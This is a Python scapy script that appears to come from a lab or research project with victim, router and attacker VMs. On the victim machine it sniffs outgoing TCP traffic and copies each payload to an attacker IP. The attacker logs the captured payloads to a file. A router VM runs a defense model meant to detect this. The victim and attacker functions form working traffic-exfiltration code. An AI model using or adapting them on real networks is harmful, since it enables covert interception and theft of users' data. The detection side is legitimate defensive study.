#!/usr/bin/python3
# Python file for the packet sniffer
# Incorporates scapy to capture packets in the network and 
# send them to the attacker

from scapy.all import *
from copy import deepcopy
from random import randint
import os
import my_ips
import router
from time import sleep


# Global 
def_model = router.DefenseModel()

#Modular packet sniffing function
def packet_sniffer(my_filter, my_prn):
    print('Calling packet sniffer function.')
    pkt = sniff(filter=my_filter, iface='eth1', prn=my_prn)

#Send packets to a destination via the router VM. The router VM
#simulates a router on the network that is equipped with the
#defense model. The packet is sent to the router, which processes
#and reroutes the packet to its intended recipient.
def send_to_router(packet):
    true_src = packet[IP].src
    true_dst = packet[IP].dst
    true_dport = packet[TCP].dport
    true_load = packet[Raw].load

    load_append = ('|ORIG_DST=' + true_dst).encode("utf-8")

    new_packet = IP(dst=my_ips.router_ip)/TCP(dport=true_dport)/Raw(load=true_load + load_append)

    print('Sending packet to router')
    r1 = send(new_packet, iface='eth1')

#Victim functions
#---

#Sends packet to attacker (via the router VM)
def send_to_attacker(packet):
    try:
        data = packet[Raw].load
    except:
        data = ''.encode("utf-8")
    if(data.decode("utf-8").find('|ORIG_DST=' + my_ips.attacker_ip) == -1):
        if(data.decode("utf-8").find('|ORIG_DST=') != -1):
            test_field = "|ORIG_DST="
            tmp_data = data.decode("utf-8").partition(test_field)
            replacement_data = tmp_data[0] + tmp_data[2]
            data = replacement_data.encode("utf-8")
        new_packet = IP(dst=my_ips.attacker_ip)/TCP(dport=80)/Raw(load=data)

        send_to_router(new_packet)
#---

#Router functions
#---

# Append the IP address info of the original sender (before being 
# forwarded by the router)
# Format is: |ORIG_SRC:xxx.xxx.xxx.xxx
def append_orig_source(data, orig_source):
    new_data = data + ('|ORIG_SRC=' + orig_source).encode("utf-8")

    return new_data

def reroute_packet(packet):
    print('Packet @ reroute_packet stage:')
    print(packet.show())
    try:
        data = packet[Raw].load
    except:
        data = ''.encode("utf-8")
    data = append_orig_source(data, packet[IP].src)

    forwarded_packet = IP()/TCP()/Raw(load=data)

    #Get destination address that was embedded in the payload
    dst_addr = get_packet_destination(data)
        
    if(dst_addr != -1):
        # Source = hardcoded router's IP address 
        forwarded_packet[IP].src = get_if_addr('eth1')
        forwarded_packet[IP].dst = dst_addr
        
        forwarded_packet[TCP].sport = packet[TCP].sport
        forwarded_packet[TCP].dport = packet[TCP].dport

        print('Forwarded packet')
        r1 = send(forwarded_packet, iface='eth1')

        defense_model(forwarded_packet)

def defense_model(packet):
    print('Getting packet IP')
    source = packet[IP].src
    print('Source:', source)


    if packet is not None:
        if def_model.check_packet_type(packet):
            key, payload = def_model.extract_and_hash_packet(packet)
            def_model.packet_comparison_algorithm(key, payload)

    
        print('Printing dictionary:')
        def_model.print_contents_of_packet_dictionary()


#Parses payload to get the true desination address of the packet.
#Needed to implement a 'router' that has the defense model.
def get_packet_destination(data):

    data = data.decode('utf-8')
    # Look for this at the end of the payload
    test_field = "|ORIG_DST="
                                                         
    # end info = information after the main payload 
    end_info = data.partition(test_field)[2] 
    if(end_info == ''):
        return -1;
                                                         
    # Split the end substring by | delimiter 
    end_list = end_info.split('|')
    
    return end_list[0]

#---

#Attacker functions
#---

def log_packet(packet):
    print('help me!')
    if packet.show() is None:
        print('logging packet')
        f = open('log_file.txt', 'a')
        f.write('\n-------------------- Victim packet --------------------')
        f.write('\nSource IP: ') 
        f.write(packet[IP].src)
        f.write('\nDestination IP: ') 
        f.write(packet[IP].dst)
        f.write('\nSource port: ') 
        f.write(str(packet[TCP].sport))
        f.write('\nDestination port: ')
        f.write(str(packet[TCP].dport))
        f.write('\nPayload: ')
        f.write(packet[Raw].load.decode('utf-8'))
        f.write('\n-------------------- End of packet --------------------')
        f.write('\n')
        f.close()

#---

if __name__=='__main__':
    local_ip = get_if_addr('eth1')
    if(local_ip == my_ips.victim_ip):
        role = 'victim'
    elif(local_ip == my_ips.attacker_ip):
        role = 'attacker'
    elif(local_ip == my_ips.router_ip):
        role = 'router'

    if(role == 'victim'):
        packet_sniffer('src host ' + local_ip + ' and tcp and not tcp[tcpflags] & (tcp-rst) != 0', send_to_attacker)
    elif(role == 'router'):
        packet_sniffer('dst host ' + my_ips.router_ip + ' and tcp', reroute_packet)
    elif(role == 'attacker'):
        packet_sniffer('src host ' + my_ips.router_ip + ' and tcp', log_packet)
